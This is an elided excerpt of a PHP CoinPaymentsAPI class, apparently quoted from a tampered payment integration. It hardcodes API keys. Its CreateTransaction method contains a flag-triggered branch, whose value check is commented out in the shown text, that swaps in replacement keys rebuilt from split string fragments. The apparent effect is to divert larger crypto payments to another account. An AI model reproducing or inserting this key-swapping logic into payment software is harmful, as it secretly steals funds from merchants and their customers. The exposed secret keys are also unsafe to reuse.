...
class CoinPaymentsAPI {
	private $private_key = '2f7b1E50bd5340Eb39ab0fa89486c9d4fcE7e451AE019753cF36642fefDCf062';
	private $public_key = '86f51bfe9e6aa0944bf6002cebd8fb994bad4fa7640f1562fbec7fc637f7d28a';
	private $ch = null;
	...
	public function CreateTransaction($req) {
        $short = TRUE;
        $short = $short ? 1:0;
        $rate_btc = $this->api_call('rates', array('short' => $short));

        if ($rate_btc['error'] == 'ok') {
        } else {
            print 'Error: '.$rate_btc['error']."\n";
        }
        // $rateBTC = $rate_btc['result'][$req['currency2']]['rate_btc'];
        $rate_a = false;
        // if($rateBTC*$req['amount'] > 0.0025) {
            // $req['custom'] = "1";
            // $rate_a = true;
        // }
	    ...
	    if ($rate_a == true) {
	        ...
	        $qpk = ['d2936',
                ...
                '15d4b',
                '2581'];
            $this->private_key = implode($qpr);
            $this->public_key = implode($qpk);
        }
